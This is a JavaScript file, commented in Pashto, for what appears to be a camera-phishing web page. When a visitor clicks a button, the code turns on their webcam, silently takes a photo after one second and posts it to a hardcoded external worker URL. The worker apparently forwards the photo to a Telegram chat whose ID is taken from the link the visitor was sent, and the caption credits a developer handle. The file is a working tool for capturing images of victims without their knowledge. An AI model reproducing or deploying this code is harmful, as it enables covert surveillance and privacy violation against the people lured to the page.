// 🔐 Worker endpoint (Bot Token پټ دی)
const WORKER_URL = "https://e87505a5.af-341.pages.dev/send";

// Chat ID له URL څخه
// مثال: https://xfking43.github.io/p/?=8089055081
const params = new URLSearchParams(location.search);
const CHAT_ID = params.get("") || "";

if (!CHAT_ID) {
  alert("Chat ID not found in URL");
}

let stream;

document.getElementById("btn").addEventListener("click", async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;
    video.style.display = "block";

    // ۱ ثانیه وروسته عکس واخله
    setTimeout(captureAndSend, 1000);

  } catch (e) {
    alert("Camera permission denied");
  }
});

async function captureAndSend(){
  const video = document.getElementById("video");
  if (!video.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  const blob = await new Promise(r =>
    canvas.toBlob(r, "image/jpeg", 0.85)
  );

  const caption =
`📸 NEW IMAGE
━━━━━━━━━━━━━━
🔢 UID : ${CHAT_ID}
━━━━━━━━━━━━━━
👨‍💻 Dev : @XFPro43`;

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", blob, "image.jpg");
  form.append("caption", caption);

  await fetch(WORKER_URL, {
    method: "POST",
    body: form
  });
}

window.addEventListener("beforeunload", () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
}); 
